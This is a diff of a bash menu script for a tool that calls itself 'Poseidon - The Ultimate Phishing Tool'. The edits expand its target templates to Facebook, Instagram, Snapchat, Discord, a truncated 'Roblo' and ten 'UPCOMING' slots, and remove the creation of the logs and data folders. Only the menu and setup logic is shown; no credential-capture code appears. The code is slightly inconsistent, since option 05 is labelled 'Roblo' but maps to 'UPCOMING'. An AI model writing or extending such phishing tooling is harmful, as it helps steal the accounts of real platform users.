@@ -15,12 +15,24 @@ show_menu() {
 EOF
     echo -e "\033[0m"
     
-    echo -e "\n\033[1;36mPoseidon - The Ultimate Phishing Tool\033[0m"
+    echo -e "\n\033[1;34mPoseidon - The Ultimate Phishing Tool\033[0m"
     echo -e "\n\033[1;34mSelect a template:\033[0m"
     echo -e "\033[1;34m----------------------------------\033[0m"
-    echo -e "\033[1;36m1. Facebook\033[0m"
-    echo -e "\033[1;36m2. Google\033[0m"
-    echo -e "\033[1;36m3. Instagram\033[0m"
+    echo -e "\033[1;34m01. Facebook\033[0m"
+    echo -e "\033[1;34m02. Instagram\033[0m"
+    echo -e "\033[1;34m03. Snapchat\033[0m"
+    echo -e "\033[1;34m04. Discord\033[0m"
+    echo -e "\033[1;34m05. Roblo\033[0m"
+    echo -e "\033[1;34m06. UPCOMING\033[0m"
+    echo -e "\033[1;34m07. UPCOMING\033[0m"
+    echo -e "\033[1;34m08. UPCOMING\033[0m"
+    echo -e "\033[1;34m09. UPCOMING\033[0m"
+    echo -e "\033[1;34m10. UPCOMING\033[0m"
+    echo -e "\033[1;34m11. UPCOMING\033[0m"
+    echo -e "\033[1;34m12. UPCOMING\033[0m"
+    echo -e "\033[1;34m13. UPCOMING\033[0m"
+    echo -e "\033[1;34m14. UPCOMING\033[0m"
+    echo -e "\033[1;34m15. UPCOMING\033[0m"
     echo -e "\033[1;31m0. Exit\033[0m"
     echo -e "\033[1;34m----------------------------------\033[0m"
 }
@@ -35,12 +47,6 @@ check_directories() {
     if [ ! -d "templates" ]; then
         echo -e "\nTemplates directory not found! Please make sure the templates directory exists."
         exit 1
-    fi
-    if [ ! -d "logs" ]; then
-        mkdir logs
-    fi
-    if [ ! -d "data" ]; then
-        mkdir data
     fi
 }
 
@@ -87,9 +93,21 @@ while true; do
     read -p "Choose an option: " option
 
     case $option in
-        1) template="facebook" ;;
-        2) template="google" ;;
-        3) template="instagram" ;;
+        01) template="Facebook" ;;
+        02) template="Instagram" ;;
+        03) template="Snapchat" ;;
+        04) template="Discord" ;;
+        05) template="UPCOMING" ;;
+        06) template="UPCOMING" ;;
+        07) template="UPCOMING" ;;
+        08) template="UPCOMING" ;;
+        09) template="UPCOMING" ;;
+        10) template="UPCOMING" ;;
+        11) template="UPCOMING" ;;
+        12) template="UPCOMING" ;;
+        13) template="UPCOMING" ;;
+        14) template="UPCOMING" ;;
+        15) template="UPCOMING" ;;
         0) echo -e "\nExiting Poseidon. Goodbye!\n"; stop_server; exit 0 ;;
         *) echo -e "\nInvalid option! Please try again.\n"; continue ;;
     esac
